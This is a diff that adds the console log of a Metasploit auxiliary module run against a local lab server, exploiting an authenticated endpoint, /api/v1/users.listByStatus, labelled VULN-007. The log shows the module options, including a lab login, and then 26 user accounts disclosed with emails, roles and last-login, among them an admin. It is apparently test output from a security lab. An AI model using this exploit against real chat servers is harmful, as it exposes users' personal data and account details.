@@ -1,0 +1,42 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/users.listByStatus
+SSL => false
+VERBOSE => true
+USERNAME => alice
+PASSWORD => Al1ce-Lab-Pass!
+COUNT => 100
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as alice (user id rSQxouLt89hux5j4J)
+[+] 127.0.0.1:39649 - VULN-007: exploited
+[+] 127.0.0.1:39649 - 26 account(s) disclosed with email, roles and last-login
+[*]   a_ffc974a5 <a_ffc974a5@lab.invalid> roles=user
+[*]   acme.owner <acme.owner@lab.invalid> roles=user
+[*]   admin <admin@lab.invalid> roles=admin
+[*]   alice <alice@lab.invalid> roles=user
+[*]   atk0_d4c1b36c <atk0_d4c1b36c@lab.invalid> roles=user
+[*]   atk1_d4c1b36c <atk1_d4c1b36c@lab.invalid> roles=user
+[*]   atk2_d4c1b36c <atk2_d4c1b36c@lab.invalid> roles=user
+[*]   atk3_d4c1b36c <atk3_d4c1b36c@lab.invalid> roles=user
+[*]   atk_475ec1f7 <atk_475ec1f7@lab.invalid> roles=user
+[*]   b_ffc974a5 <b_ffc974a5@lab.invalid> roles=user
+[*]   bob <bob@lab.invalid> roles=user
+[*]   bsp_agent_b1 <bsp_agent_b1@lab.invalid> roles=user,livechat-agent
+[*]   bsp_squat_b1 <bsp_squat_b1@lab.invalid> roles=user
+[*]   carol <carol@lab.invalid> roles=user
+[*]   globex.owner <globex.owner@lab.invalid> roles=user
+[*]   m2fa_834f80 <m2fa_834f80@lab.invalid> roles=user
+[*]   m2fa_bs36 <m2fa_bs36@lab.invalid> roles=user
+[*]   oaseed <oaseed@lab.invalid> roles=user
+[*]   oth_6536a0a3 <oth_6536a0a3@lab.invalid> roles=user
+[*]   pwp_834f80 <pwp_834f80@lab.invalid> roles=user
+[*]   pwp_bs36 <pwp_bs36@lab.invalid> roles=user
+[*]   rocket.cat <> roles=bot
+[*]   vic_475ec1f7 <vic_475ec1f7@lab.invalid> roles=user
+[*]   vic_6536a0a3 <vic_6536a0a3@lab.invalid> roles=user
+[*]   vic_d4c1b36c <vic_d4c1b36c@lab.invalid> roles=user
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124200329_default_127.0.0.1_blue_spider.vuln_061625.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
